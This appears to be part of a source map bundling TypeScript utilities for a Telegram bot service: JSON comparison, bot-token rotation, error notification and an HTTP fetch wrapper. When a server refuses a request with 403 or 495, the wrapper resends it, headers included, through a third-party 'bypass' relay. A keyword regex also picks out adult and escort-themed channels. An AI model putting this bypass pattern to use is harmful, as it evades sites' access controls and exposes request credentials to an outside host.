keysToIgnore = ['id', '_id', 'createdAt', 'updatedAt', 'timestamp', 'time', 'date', 'timeStamp', 'created_at', 'updated_at'];\n  const MAX_DEPTH = 10;\n\n  function compare(obj1: unknown, obj2: unknown, path: string = '', depth: number = 0): boolean {\n    // Stop recursion at max depth\n    if (depth > MAX_DEPTH) {\n      console.log(`[DEPTH LIMIT] Reached max depth at path: ${path}`);\n      return obj1 !== obj2;\n    }\n\n    // Handle null/undefined\n    if (obj1 === null || obj1 === undefined || obj2 === null || obj2 === undefined) {\n      if (obj1 !== obj2) {\n        console.log(`[MISMATCH] ${path}: ${obj1} !== ${obj2}`);\n        return true;\n      }\n      return false;\n    }\n\n    // Handle different types\n    if (typeof obj1 !== typeof obj2) {\n      console.log(`[MISMATCH] ${path}: type ${typeof obj1} !== ${typeof obj2}`);\n      return true;\n    }\n\n    // Handle non-objects (primitives)\n    if (typeof obj1 !== 'object') {\n      if (obj1 !== obj2) {\n        console.log(`[MISMATCH] ${path}: ${obj1} !== ${obj2}`);\n        return true;\n      }\n      return false;\n    }\n\n    // Handle arrays\n    if (Array.isArray(obj1) && Array.isArray(obj2)) {\n      if (obj1.length !== obj2.length) {\n        console.log(`[MISMATCH] ${path}: array length ${obj1.length} !== ${obj2.length}`);\n        return true;\n      }\n\n      for (let i = 0; i < obj1.length; i++) {\n        const arrayPath = path ? `${path}[${i}]` : `[${i}]`;\n        if (compare(obj1[i], obj2[i], arrayPath, depth + 1)) {\n          return true;\n        }\n      }\n      return false;\n    }\n\n    // Handle array vs non-array\n    if (Array.isArray(obj1) || Array.isArray(obj2)) {\n      console.log(obj1, obj2);\n      console.log(`[MISMATCH] ${path}: one is array, other is not`);\n      return true;\n    }\n\n    // Handle objects\n    const record1 = obj1 as Record<string, unknown>;\n    const record2 = obj2 as Record<string, unknown>;\n\n    // Get all keys (excluding ignored ones)\n    const keys1 = Object.keys(record1).filter(key => !keysToIgnore.includes(key));\n    const keys2 = Object.keys(record2).filter(key => !keysToIgnore.includes(key));\n\n    // Check if different number of keys\n    if (keys1.length !== keys2.length) {\n      console.log(`[MISMATCH] ${path}: different key count ${keys1.length} !== ${keys2.length}`);\n      console.log(`[KEYS] obj1: [${keys1.join(', ')}]`);\n      console.log(`[KEYS] obj2: [${keys2.join(', ')}]`);\n      return true;\n    }\n\n    // Check if all keys from obj1 exist in obj2\n    for (const key of keys1) {\n      if (!keys2.includes(key)) {\n        console.log(`[MISMATCH] ${path}: key \"${key}\" missing in obj2`);\n        return true;\n      }\n    }\n\n    // Compare values for each key\n    for (const key of keys1) {\n      const keyPath = path ? `${path}.${key}` : key;\n      if (compare(record1[key], record2[key], keyPath, depth + 1)) {\n        return true;\n      }\n    }\n\n    return false;\n  }\n\n  const result = compare(json1, json2);\n  console.log(`[COMPARISON END] Result: ${result ? 'DIFFERENT' : 'SAME'}`);\n\n  return result;\n}\n\nexport function mapToJson<K extends string | number | symbol, V>(map: Map<K, V>): Record<string, V> {\n  if (!(map instanceof Map)) {\n    throw new Error('Input must be a Map instance');\n  }\n  const obj: Record<string, V> = {};\n  for (const [key, value] of map.entries()) {\n    obj[String(key)] = value;\n  }\n  return obj;\n}\n\nexport function shouldMatch(obj) {\n  const regex = /(wife|adult|lanj|chat|𝑭𝒂𝒎𝒊𝒍𝒚|𝙏𝙖𝙢𝙞𝙡|𝐒𝐖𝐀𝐏|lesb|aunty|girl|boy|tamil|kannad|telugu|hindi|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi)/i\n  const titleMatch = obj.title && regex.test(obj.title);\n  const usernameMatch = obj.username && regex.test(obj.username);\n  return !!(titleMatch || usernameMatch);\n}","import axios, { AxiosRequestConfig, AxiosResponse } from \"axios\";\r\nimport { extractMessage, parseError } from \"./parseError\";\r\nimport { clog } from \"./ChannelLogger\";\r\nimport { sleep } from \"./common\";\r\nimport { BotConfig, ChannelCategory } from \"./TelegramBots.config\";\r\n\r\n// Configuration types\r\ninterface RetryConfig {\r\n    maxRetries: number;\r\n    baseDelay: number;\r\n    maxDelay: number;\r\n    jitterFactor: number;\r\n}\r\n\r\ninterface NotificationConfig {\r\n    enabled: boolean;\r\n    channelEnvVar: string;\r\n    timeout: number;\r\n}\r\n\r\n// Default configurations\r\nconst DEFAULT_RETRY_CONFIG: RetryConfig = {\r\n    maxRetries: 3,\r\n    baseDelay: 500, // Start with 500ms\r\n    maxDelay: 30000, // Cap at 30 seconds\r\n    jitterFactor: 0.2, // Add up to 20% jitter\r\n};\r\n\r\nconst DEFAULT_NOTIFICATION_CONFIG: NotificationConfig = {\r\n    enabled: true,\r\n    channelEnvVar: 'httpFailuresChannel',\r\n    timeout: 5000,\r\n};\r\n\r\n/**\r\n * Sends error notifications to configured channels\r\n * @param prefix - Notification message prefix\r\n * @param errorDetails - Error details to include in notification\r\n * @param config - Notification configuration\r\n * @returns Promise that resolves when notification is sent\r\n */\r\nasync function notifyInternal(\r\n  prefix: string,\r\n  errorDetails: { message: any; status?: number },\r\n  config: NotificationConfig = DEFAULT_NOTIFICATION_CONFIG\r\n): Promise<void> {\r\n  if (!config.enabled) return;\r\n  prefix = `${prefix} ${process.env.clientId}`;\r\n  try {\r\n    const errorMessage = typeof errorDetails.message === 'string'\r\n      ? errorDetails.message\r\n      : JSON.stringify(errorDetails.message);\r\n\r\n    const formattedMessage = errorMessage.includes('ETIMEDOUT') ? 'Connection timed out' :\r\n      errorMessage.includes('ECONNREFUSED') ? 'Connection refused' :\r\n        extractMessage(errorDetails?.message);\r\n\r\n    console.error(`${prefix}\\n${formattedMessage}`);\r\n    if (errorDetails.status === 429) return;\r\n    const notificationText = `${prefix}\\n\\n${formattedMessage}`;\r\n\r\n    try {\r\n      await BotConfig.getInstance().sendMessage(ChannelCategory.HTTP_FAILURES, notificationText);\r\n    } catch (error) {\r\n      console.error(\"Failed to send notification:\", error.response?.data || error.message || error.code);\r\n    }\r\n  } catch (error) {\r\n    console.error(\"Error in notification process:\", error.response?.data || error.message || error.code);\r\n  }\r\n}\r\n\r\n/**\r\n * Common network errors that should trigger retries\r\n */\r\nconst RETRYABLE_NETWORK_ERRORS = [\r\n    'ETIMEDOUT',\r\n    'ECONNABORTED',\r\n    'ECONNREFUSED',\r\n    'ECONNRESET',\r\n    'ERR_NETWORK',\r\n    'ERR_BAD_RESPONSE',\r\n    'EHOSTUNREACH',\r\n    'ENETUNREACH'\r\n];\r\n\r\n/**\r\n * HTTP status codes that should trigger retries\r\n */\r\nconst RETRYABLE_STATUS_CODES = [408, 500, 502, 503, 504];\r\n\r\n/**\r\n * Determines if an error should trigger a retry\r\n * @param error - The axios error\r\n * @param parsedError - Parsed error with status code\r\n * @returns boolean indicating whether to retry the request\r\n */\r\nfunction shouldRetry(error: unknown, parsedError: { status: number }): boolean {\r\n    if (axios.isAxiosError(error)) {\r\n        if (error.code && RETRYABLE_NETWORK_ERRORS.includes(error.code)) {\r\n            return true;\r\n        }\r\n\r\n        if (error.message?.toLowerCase().includes('timeout')) {\r\n            return true;\r\n        }\r\n    }\r\n\r\n    return RETRYABLE_STATUS_CODES.includes(parsedError.status);\r\n}\r\n\r\n/**\r\n * Calculates backoff time for retry attempts\r\n * @param attempt - Current attempt number (0-based)\r\n * @param config - Retry configuration\r\n * @returns Delay in milliseconds before next retry\r\n */\r\nfunction calculateBackoff(attempt: number, config: RetryConfig = DEFAULT_RETRY_CONFIG): number {\r\n    const base = Math.min(config.baseDelay * Math.pow(2, attempt), config.maxDelay);\r\n    const jitter = Math.random() * (base * config.jitterFactor);\r\n    return Math.floor(base + jitter);\r\n}\r\n\r\n/**\r\n * Makes a request through a bypass service when regular requests fail with certain errors\r\n * @param url - Target URL\r\n * @param options - Request options\r\n * @returns Axios response from bypass service\r\n */\r\nasync function makeBypassRequest(\r\n    url: string,\r\n    options: AxiosRequestConfig & { bypassUrl?: string }\r\n): Promise<AxiosResponse> {\r\n    const bypassUrl = options.bypassUrl || process.env.bypassURL || '';\r\n\r\n    if (!bypassUrl) {\r\n        throw new Error('Bypass URL is not provided');\r\n    }\r\n\r\n    const finalBypassUrl = bypassUrl.startsWith('http') ?\r\n        bypassUrl :\r\n        'https://ravishing-perception-production.up.railway.app/execute-request';\r\n\r\n    const bypassAxios = axios.create({\r\n        responseType: options.responseType || 'json',\r\n        maxContentLength: Infinity,\r\n        maxBodyLength: Infinity,\r\n        timeout: options.timeout || 30000\r\n    });\r\n\r\n    const response = await bypassAxios.post(finalBypassUrl, {\r\n        url,\r\n        method: options.method,\r\n        headers: options.headers,\r\n        data: options.data,\r\n        params: options.params,\r\n        responseType: options.responseType,\r\n        timeout: options.timeout,\r\n        followRedirects: options.maxRedirects !== 0,\r\n        maxRedirects: options.maxRedirects\r\n    }, {\r\n        headers: {\r\n            'Content-Type': 'application/json',\r\n            ...options.headers\r\n        }\r\n    });\r\n\r\n    // Handle binary responses\r\n    if (response && (\r\n        options.responseType === 'arraybuffer' ||\r\n        response.headers['content-type']?.includes('application/octet-stream') ||\r\n        response.headers['content-type']?.includes('image/') ||\r\n        response.headers['content-type']?.includes('audio/') ||\r\n        response.headers['content-type']?.includes('video/') ||\r\n        response.headers['content-type']?.includes('application/pdf'))) {\r\n\r\n        response.data = Buffer.from(response.data);\r\n    }\r\n\r\n    return response;\r\n}\r\n\r\n/**\r\n * Parses a URL and extracts host and endpoint information\r\n * @param url - URL to parse\r\n * @returns Object containing host and endpoint\r\n */\r\nfunction parseUrl(url: string): { host: string; endpoint: string } | null {\r\n    if (!url || typeof url !== 'string') {\r\n        return null;\r\n    }\r\n\r\n    try {\r\n        const parsedUrl = new URL(url);\r\n        return {\r\n            host: parsedUrl.host,\r\n            endpoint: parsedUrl.pathname + parsedUrl.search\r\n        };\r\n    } catch (error) {\r\n        return null;\r\n    }\r\n}\r\n\r\n/**\r\n * Extended options for fetch requests\r\n */\r\ninterface FetchWithTimeoutOptions extends AxiosRequestConfig {\r\n    bypassUrl?: string;\r\n    retryConfig?: RetryConfig;\r\n    notificationConfig?: NotificationConfig;\r\n}\r\n\r\n/**\r\n * Makes HTTP requests with timeout handling and retry logic\r\n * @param url - Target URL\r\n * @param options - Request options with custom extensions\r\n * @returns Promise resolving to Axios response or undefined if all retries fail\r\n */\r\nexport async function fetchWithTimeout(\r\n    url: string,\r\n    options: FetchWithTimeoutOptions = {},\r\n    maxRetries?: number // Kept for backward compatibility\r\n): Promise<AxiosResponse | undefined> {\r\n    console.log(`Fetching URL: ${url} with options:`, options);\r\n    // Input validation\r\n    if (!url) {\r\n        console.error('URL is empty');\r\n        return undefined;\r\n    }\r\n\r\n    // Merge default and custom configurations\r\n    const retryConfig: RetryConfig = {\r\n        ...DEFAULT_RETRY_CONFIG,\r\n        ...options.retryConfig,\r\n        maxRetries: maxRetries !== undefined ? maxRetries : (options.retryConfig?.maxRetries || DEFAULT_RETRY_CONFIG.maxRetries)\r\n    };\r\n\r\n    const notificationConfig: NotificationConfig = {\r\n        ...DEFAULT_NOTIFICATION_CONFIG,\r\n        ...options.notificationConfig\r\n    };\r\n\r\n    // Initialize request options with defaults\r\n    options.timeout = options.timeout || 30000;\r\n    options.method = options.method || \"GET\";\r\n\r\n    // Parse URL for error reporting\r\n    const urlInfo = parseUrl(url);\r\n    if (!urlInfo) {\r\n        console.error(`Invalid URL: ${url}`);\r\n        return undefined;\r\n    }\r\n\r\n    const { host, endpoint } = urlInfo;\r\n    const clientId = process.env.clientId || 'UnknownClient';\r\n\r\n    // Main retry loop\r\n    let lastError: Error | null = null;\r\n\r\n    for (let attempt = 0; attempt <= retryConfig.maxRetries; attempt++) {\r\n        // Create controller for this attempt\r\n        const controller = new AbortController();\r\n        const currentTimeout = options.timeout + (attempt * 5000);\r\n\r\n        // Set up timeout to abort the request if it takes too long\r\n        const timeoutId = setTimeout(() => {\r\n            try {\r\n                controller.abort();\r\n            } catch (abortError) {\r\n                console.error(\"Error during abort:\", abortError);\r\n            }\r\n        }, currentTimeout);\r\n\r\n        try {\r\n            // Make the request\r\n            const response = await axios({\r\n                ...options,\r\n                url,\r\n                signal: controller.signal,\r\n                maxRedirects: options.maxRedirects ?? 5,\r\n                timeout: currentTimeout,\r\n            });\r\n\r\n            // Success! Clean up and return response\r\n            clearTimeout(timeoutId);\r\n            return response;\r\n\r\n        } catch (error) {\r\n            // Clean up timeout\r\n            clearTimeout(timeoutId);\r\n\r\n            // Process error and determine if retry is needed\r\n            lastError = error instanceof Error ? error : new Error(String(error));\r\n\r\n            // Try to parse the error for better handling\r\n            let parsedError;\r\n            try {\r\n                parsedError = parseError(error, `host: ${host}\\nendpoint:${endpoint}`, false);\r\n            } catch (parseErrorError) {\r\n                console.error(\"Error in parseError:\", parseErrorError);\r\n                parsedError = { status: 500, message: String(error), error: \"ParseError\" };\r\n            }\r\n\r\n            // Extract message for notifications\r\n            const message = parsedError.message;\r\n\r\n            // Check if it's a timeout\r\n            const isTimeout = axios.isAxiosError(error) && (\r\n                error.code === \"ECONNABORTED\" ||\r\n                (message && message.includes(\"timeout\")) ||\r\n                parsedError.status === 408\r\n            );\r\n\r\n            // Handle 403/495 with bypass\r\n            if (parsedError.status === 403 || parsedError.status === 495) {\r\n                try {\r\n                    const bypassResponse = await makeBypassRequest(url, options);\r\n                    if (bypassResponse) {\r\n                        await notifyInternal(\r\n                            `Successfully Bypassed the request`,\r\n                            { message: `${clientId} host=${host}\\nendpoint=${endpoint}` },\r\n                            notificationConfig\r\n                        );\r\n                        return bypassResponse;\r\n                    }\r\n                } catch (bypassError) {\r\n                    let errorDetails;\r\n                    try {\r\n                        const bypassParsedError = parseError(bypassError, `host: ${host}\\nendpoint:${endpoint}`, false);\r\n                        errorDetails = extractMessage(bypassParsedError);\r\n                    } catch (extractBypassError) {\r\n                        console.error(\"Error extracting bypass error message:\", extractBypassError);\r\n                        errorDetails = String(bypassError);\r\n                    }\r\n\r\n                    await notifyInternal(\r\n                        `Bypass attempt failed`,\r\n                        { message: `host=${host}\\nendpoint=${endpoint}\\n${`msg: ${errorDetails.slice(0, 150)}\\nURL: ${url}`}` },\r\n                        notificationConfig\r\n                    );\r\n                }\r\n            } else {\r\n                // Notify about the error\r\n                if (isTimeout) {\r\n                    await notifyInternal(\r\n                        `Request timeout on attempt ${attempt}`,\r\n                        {\r\n                            message: `${clientId} host=${host}\\nendpoint=${endpoint}\\ntimeout=${options.timeout}ms`,\r\n                            status: 408\r\n                        },\r\n                        notificationConfig\r\n                    );\r\n                } else {\r\n                    await notifyInternal(\r\n                        `Attempt ${attempt} failed`,\r\n                        {\r\n                            message: `${clientId} host=${host}\\nendpoint=${endpoint}\\n${`mgs: ${message.slice(0, 150)}`}`,\r\n                            status: parsedError.status\r\n                        },\r\n                        notificationConfig\r\n                    );\r\n                }\r\n            }\r\n\r\n            // Check if we should retry\r\n            if (attempt < retryConfig.maxRetries && shouldRetry(error, parsedError)) {\r\n                const delay = calculateBackoff(attempt, retryConfig);\r\n                console.log(`Retrying request (${attempt + 1}/${retryConfig.maxRetries}) after ${delay}ms`);\r\n                await sleep(delay);\r\n                continue;\r\n            }\r\n\r\n            // If this is the last attempt, break out of the loop\r\n            if (attempt >= retryConfig.maxRetries) {\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    // If we get here, all retries failed\r\n    try {\r\n        let errorData;\r\n        try {\r\n            if (lastError) {\r\n                const parsedLastError = parseError(lastError, `${clientId} host: ${host}\\nendpoint:${endpoint}`, false);\r\n                errorData = extractMessage(parsedLastError);\r\n            } else {\r\n                errorData = 'Unknown error';\r\n            }\r\n        } catch (extractLastError) {\r\n            console.error(\"Error extracting last error:\", extractLastError);\r\n            errorData = String(lastError) || 'Unknown error';\r\n        }\r\n\r\n        await notifyInternal(\r\n            `All ${retryConfig.maxRetries} retries exhausted`,\r\n            { message: `${errorData.slice(0, 150)}` },\r\n            notificationConfig\r\n        );\r\n    } catch (finalError) {\r\n        console.error('Failed to send final error notification:', finalError);\r\n    }\r\n\r\n    // Return undefined to indicate failure\r\n    return undefined;\r\n}","export {\r\n    contains, sleep, defaultMessages,\r\n    defaultReactions, fetchNumbersFromString,\r\n    areJsonsNotSame, mapToJson, shouldMatch, toBoolean\r\n} from './common';\r\nexport { fetchWithTimeout } from './fetchWithTimeout';\r\nexport { ppplbot } from './logbots';\r\nexport { parseError } from './parseError';","const getBotTokens = () => {\r\n    const botTokens = (process.env.BOT_TOKENS || '').split(',').filter(Boolean);\r\n    if (botTokens.length === 0) {\r\n        throw new Error('No bot tokens configured. Please set BOT_TOKENS environment variable');\r\n    }\r\n    return botTokens;\r\n};\r\n\r\nlet botTokens: string[] | null = null;\r\nlet currentTokenIndex = 0;\r\n\r\nconst initializeBotTokens = () => {\r\n    if (botTokens === null) {\r\n        botTokens = getBotTokens();\r\n    }\r\n    return botTokens;\r\n};\r\n\r\nexport function getBotToken() {\r\n    return initializeBotTokens()[currentTokenIndex];\r\n}\r\n\r\nexport function notifbot(chatId: string = process.env.accountsChannel || \"-1001801844217\", botToken?: string): string {\r\n    const tokens = initializeBotTokens();\r\n    const token = botToken || tokens[currentTokenIndex];\r\n    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;\r\n\r\n    if (!botToken) {\r\n        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;\r\n    }\r\n\r\n    return apiUrl;\r\n}\r\n\r\nexport function ppplbot(chatId: string = process.env.updatesChannel || '-1001972065816', botToken?: string): string {\r\n    const tokens = initializeBotTokens();\r\n    const token = botToken || tokens[currentTokenIndex];\r\n    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;\r\n\r\n    if (!botToken) {\r\n        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;\r\n    }\r\n\r\n    return apiUrl;\r\n}\r\n","import { notifbot } from \"./logbots\";\r\nimport axios, { AxiosError, AxiosResponse } from \"axios\";\r\n\r\n/**\r\n * Error response interface for standardized error format\r\n */\r\ninterface ErrorResponse {\r\n  status: number;\r\n  message: string;\r\n  error: string;\r\n  raw?: any;\r\n}\r\n\r\n/**\r\n * Configuration options for error handling\r\n */\r\ninterface ErrorHandlingConfig {\r\n  maxMessageLength: number;\r\n  notificationTimeout: number;\r\n  ignorePatterns: RegExp[];\r\n  defaultStatus: number;\r\n  defaultMessage: string;\r\n  defaultError: string;\r\n}\r\n\r\n// Default configuration for error handling\r\nconst DEFAULT_ERROR_CONFIG: ErrorHandlingConfig = {\r\n  maxMessageLength: 200,\r\n  notificationTimeout: 10000,\r\n  ignorePatterns: [\r\n    /INPUT_USER_DEACTIVATED/i,\r\n    /too many req/i,\r\n    /could not find/i,\r\n    /ECONNREFUSED/i\r\n  ],\r\n  defaultStatus: 500,\r\n  defaultMessage: 'An unknown error occurred',\r\n  defaultError: 'UnknownError'\r\n};\r\n\r\n/**\r\n * Safely stringifies objects of any depth\r\n * @param data - Data to stringify\r\n * @param depth - Current recursion depth\r\n * @param maxDepth - Maximum recursion depth\r\n * @returns String representation of data\r\n */\r\nfunction safeStringify(data: any, depth = 0, maxDepth = 3): string {\r\n  if (depth > maxDepth) {\r\n    return '[Max Depth Reached]';\r\n  }\r\n\r\n  try {\r\n    if (data === null || data === undefined) {\r\n      return String(data);\r\n    }\r\n\r\n    if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {\r\n      return String(data);\r\n    }\r\n\r\n    if (data instanceof Error) {\r\n      return data.message || data.toString();\r\n    }\r\n\r\n    if (Array.isArray(data)) {\r\n      if (data.length === 0) return '[]';\r\n      return `[${data.map(item => safeStringify(item, depth + 1, maxDepth)).join(', ')}]`;\r\n    }\r\n\r\n    if (typeof data === 'object') {\r\n      const entries = Object.entries(data)\r\n        .filter(([_, v]) => v !== undefined && v !== null)\r\n        .map(([k, v]) => `${k}: ${safeStringify(v, depth + 1, maxDepth)}`);\r\n\r\n      if (entries.length === 0) return '{}';\r\n      return `{${entries.join(', ')}}`;\r\n    }\r\n\r\n    return String(data);\r\n  } catch (error) {\r\n    return `[Error Stringifying: ${error instanceof Error ? error.message : String(error)}]`;\r\n  }\r\n}\r\n\r\n/**\r\n * Extracts meaningful message from nested data structure\r\n * @param data - The data to extract messages from\r\n * @param path - Current object path for nested values\r\n * @param maxDepth - Maximum depth to traverse\r\n * @returns Extracted message as string\r\n */\r\nexport function extractMessage(data: any, path = '', depth = 0, maxDepth = 5): string {\r\n  try {\r\n    // Prevent excessive recursion\r\n    if (depth > maxDepth) {\r\n      return `${path}=[Max Depth Reached]`;\r\n    }\r\n\r\n    // Handle simple types directly\r\n    if (data === null || data === undefined) {\r\n      return '';\r\n    }\r\n\r\n    if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {\r\n      return path ? `${path}=${data}` : String(data);\r\n    }\r\n\r\n    // Handle Error objects\r\n    if (data instanceof Error) {\r\n      const errorInfo = [\r\n        data.message ? `message=${data.message}` : '',\r\n        data.name ? `name=${data.name}` : '',\r\n        data.stack ? `stack=${data.stack.split('\\n')[0]}` : ''\r\n      ].filter(Boolean).join('\\n');\r\n\r\n      return path ? `${path}=(${errorInfo})` : errorInfo;\r\n    }\r\n\r\n    // Handle arrays\r\n    if (Array.isArray(data)) {\r\n      if (data.length === 0) {\r\n        return '';\r\n      }\r\n\r\n      return data\r\n        .map((item, index) => extractMessage(item, path ? `${path}[${index}]` : `[${index}]`, depth + 1, maxDepth))\r\n        .filter(Boolean)\r\n        .join('\\n');\r\n    }\r\n\r\n    // Handle objects\r\n    if (typeof data === 'object') {\r\n      const messages: string[] = [];\r\n\r\n      for (const key of Object.keys(data)) {\r\n        const value = data[key];\r\n        const newPath = path ? `${path}.${key}` : key;\r\n\r\n        const extracted = extractMessage(value, newPath, depth + 1, maxDepth);\r\n        if (extracted) {\r\n          messages.push(extracted);\r\n        }\r\n      }\r\n\r\n      return messages.join('\\n');\r\n    }\r\n\r\n    // Fallback\r\n    return '';\r\n  } catch (error) {\r\n    console.error(\"Error in extractMessage:\", error);\r\n    return `Error extracting message: ${error instanceof Error ? error.message : String(error)}`;\r\n  }\r\n}\r\n\r\n/**\r\n * Sends an HTTP notification\r\n * @param url - URL to send notification to\r\n * @param timeout - Request timeout in ms\r\n * @returns Promise resolving to response or undefined on error\r\n */\r\nasync function sendNotification(url: string, timeout = DEFAULT_ERROR_CONFIG.notificationTimeout): Promise<AxiosResponse | undefined> {\r\n  try {\r\n    // Validate URL before sending\r\n    if (!url || typeof url !== 'string' || !url.startsWith('http')) {\r\n      console.error(\"Invalid notification URL:\", url);\r\n      return undefined;\r\n    }\r\n\r\n    return await axios.get(url, {\r\n      timeout,\r\n      validateStatus: status => status < 500 // Consider 4xx as \"successful\" notifications\r\n    });\r\n  } catch (error) {\r\n    console.error(\"Failed to send notification:\", error instanceof Error ? error.message : String(error));\r\n    return undefined;\r\n  }\r\n}\r\n\r\n/**\r\n * Checks if an error should be ignored for notification\r\n * @param message - Error message to check\r\n * @param status - HTTP status code\r\n * @param patterns - RegExp patterns to ignore\r\n * @returns Boolean indicating if error should be ignored\r\n */\r\nfunction shouldIgnoreError(message: string, status: number, patterns: RegExp[]): boolean {\r\n  if (status === 429) return true;  // Always ignore rate limiting errors\r\n\r\n  return patterns.some(pattern => pattern.test(message));\r\n}\r\n\r\n/**\r\n * Extracts status code from error or response object\r\n * @param err - Error object to parse\r\n * @param defaultStatus - Default status code if none found\r\n * @returns HTTP status code\r\n */\r\nfunction extractStatusCode(err: any, defaultStatus: number): number {\r\n  if (!err) return defaultStatus;\r\n\r\n  // Try to extract from response\r\n  if (err.response) {\r\n    const response = err.response;\r\n    return response.data?.statusCode ||\r\n           response.data?.status ||\r\n           response.data?.ResponseCode ||\r\n           response.status ||\r\n           err.status ||\r\n           defaultStatus;\r\n  }\r\n\r\n  // Try direct properties\r\n  return err.statusCode || err.status || defaultStatus;\r\n}\r\n\r\n/**\r\n * Extracts error message from error or response object\r\n * @param err - Error object to parse\r\n * @param defaultMessage - Default message if none found\r\n * @returns Extracted error message\r\n */\r\nfunction extractErrorMessage(err: any, defaultMessage: string): string {\r\n  if (!err) return defaultMessage;\r\n\r\n  // Error message from response\r\n  if (err.response?.data) {\r\n    const responseData = err.response.data;\r\n    return responseData.message ||\r\n           responseData.errors ||\r\n           responseData.ErrorMessage ||\r\n           responseData.errorMessage ||\r\n           responseData.UserMessage ||\r\n           (typeof responseData === 'string' ? responseData : null) ||\r\n           err.response.statusText ||\r\n           err.message ||\r\n           defaultMessage;\r\n  }\r\n\r\n  // Error message from request\r\n  if (err.request) {\r\n    return err.data?.message ||\r\n           err.data?.errors ||\r\n           err.data?.ErrorMessage ||\r\n           err.data?.errorMessage ||\r\n           err.data?.UserMessage ||\r\n           (typeof err.data === 'string' ? err.data : null) ||\r\n           err.message ||\r\n           err.statusText ||\r\n           'The request was triggered but no response was received';\r\n  }\r\n\r\n  // Direct error message\r\n  return err.message || err.errorMessage || defaultMessage;\r\n}\r\n\r\n/**\r\n * Extracts error type from error or response object\r\n * @param err - Error object to parse\r\n * @param defaultError - Default error type if none found\r\n * @returns Error type as string\r\n */\r\nfunction extractErrorType(err: any, defaultError: string): string {\r\n  if (!err) return defaultError;\r\n\r\n  if (err.response?.data?.error) {\r\n    return err.response.data.error;\r\n  }\r\n\r\n  return err.error || err.name || err.code || defaultError;\r\n}\r\n\r\n/**\r\n * Parses and standardizes error objects for consistent handling\r\n * @param err - Error to parse\r\n * @param prefix - Prefix to add to error message\r\n * @param sendErr - Whether to send a notification for this error\r\n * @param config - Error handling configuration\r\n * @returns Standardized error response\r\n */\r\nexport function parseError(\r\n  err: any,\r\n  prefix?: string,\r\n  sendErr: boolean = true,\r\n  config: Partial<ErrorHandlingConfig> = {}\r\n): ErrorResponse {\r\n  // Merge with default config\r\n  const fullConfig = { ...DEFAULT_ERROR_CONFIG, ...config };\r\n\r\n  try {\r\n    const clientId = process.env.clientId || 'UptimeChecker2';\r\n    const prefixStr = `${clientId}${prefix ? ` - ${prefix}` : ''}`;\r\n\r\n    // Extract error components\r\n    const status = extractStatusCode(err, fullConfig.defaultStatus);\r\n    const rawMessage = extractErrorMessage(err, fullConfig.defaultMessage);\r\n    const error = extractErrorType(err, fullConfig.defaultError);\r\n\r\n    // Process the raw message to get a clean version\r\n    let extractedMessage;\r\n    try {\r\n      extractedMessage = typeof rawMessage === 'string' ? rawMessage : extractMessage(rawMessage);\r\n    } catch (e) {\r\n      extractedMessage = safeStringify(rawMessage) || 'Error extracting message';\r\n    }\r\n\r\n    // Prepare the full message for logging\r\n    const fullMessage = `${prefixStr} :: ${extractedMessage}`;\r\n    console.log(\"parsedErr: \", fullMessage);\r\n\r\n    // Prepare response object\r\n    const response: ErrorResponse = {\r\n      status,\r\n      message: err.errorMessage ? err.errorMessage : String(fullMessage).slice(0, fullConfig.maxMessageLength),\r\n      error,\r\n      raw: err\r\n    };\r\n\r\n    // Send notification if requested and applicable\r\n    if (sendErr) {\r\n      try {\r\n        const ignoreError = shouldIgnoreError(fullMessage, status, fullConfig.ignorePatterns);\r\n\r\n        if (!ignoreError) {\r\n          const notificationMessage = err.errorMessage ? err.errorMessage : extractedMessage;\r\n          const notifUrl = `${notifbot()}&text=${encodeURIComponent(prefixStr)} :: ${encodeURIComponent(notificationMessage)}`;\r\n\r\n          // Use Promise but don't await to avoid delaying the response\r\n          sendNotification(notifUrl, fullConfig.notificationTimeout)\r\n            .catch(e => console.error(\"Failed to send error notification:\", e));\r\n        }\r\n      } catch (notificationError) {\r\n        console.error('Failed to prepare error notification:', notificationError);\r\n      }\r\n    }\r\n\r\n    return response;\r\n  } catch (fatalError) {\r\n    console.error(\"Fatal error in parseError:\", fatalError);\r\n    return {\r\n      status: fullConfig.defaultStatus,\r\n      message: \"Error in error handling\",\r\n      error: \"FatalError\",\r\n      raw: err\r\n    };\r\n  }\r\n}\r\n\r\n/**\r\n * Type guard for Axios errors\r\n * @param error - Error to check\r\n * @returns Boolean indicating if error is an Axios error\r\n */\r\nexport function isAxiosError(error: unknown): error is AxiosError {\r\n  return axios.isAxiosError(error);\r\n}\r\n\r\n/**\r\n * Creates error objects with consistent format\r\n * @param message - Error message\r\n * @param status - HTTP status code\r\n * @param errorType - Error type\r\n * @returns Standardized error response\r\n */\r\nexport function createError(message: string, status = 500, errorType = 'ApplicationError'): ErrorResponse {\r\n  return {\r\n    status,\r\n    message,\r\n    error: errorType\r\n  };\r\n}\r\n\r\n/**\r\n * Error handling utilities for HTTP requests and responses\r\n */\r\nexport const ErrorUtils = {\r\n  parseError,\r\n  extractMessage,\r\n  sendNotification,\r\n  createError,\r\n  isAxiosError\r\n};","module.exports = require(\"@nestjs/common\");","module.exports = require(\"@nestjs/config\");","module.exports = require(\"@nestjs/core\");","module.exports = require(\"@nestjs/mapped-types\");","module.exports = require(\"@nestjs/mongoose\");","module.exports = require(\"@nestjs/platform-express\");","module.exports = require(\"@nestjs/swagger\");","module.exports = require(\"adm-zip\");","module.exports = require(\"axios\");","module.exports = require(\"big-integer\");","module.exports = require(\"class-transformer\");","module.exports = require(\"class-validator\");","module.exports = require(\"cloudinary\");","module.exports = require(\"crypto\");","module.exports = require(\"form-data\");","module.exports = require(\"fs\");","module.exports = require(\"https\");","module.exports = require(\"imap\");","module.exports = require(\"lodash\");","module.exports = require(\"mongoose\");","module.exports = require(\"multer\");","module.exports = require(\"path\");","module.exports = require(\"telegram\");","module.exports = require(\"telegram/Helpers\");","module.exports = require(\"telegram/Password\");","module.exports = require(\"telegram/client/uploads\");","module.exports = require(\"telegram/events\");","module.exports = require(\"telegram/extensions/Logger\");","module.exports = require(\"telegram/sessions\");","module.exports = 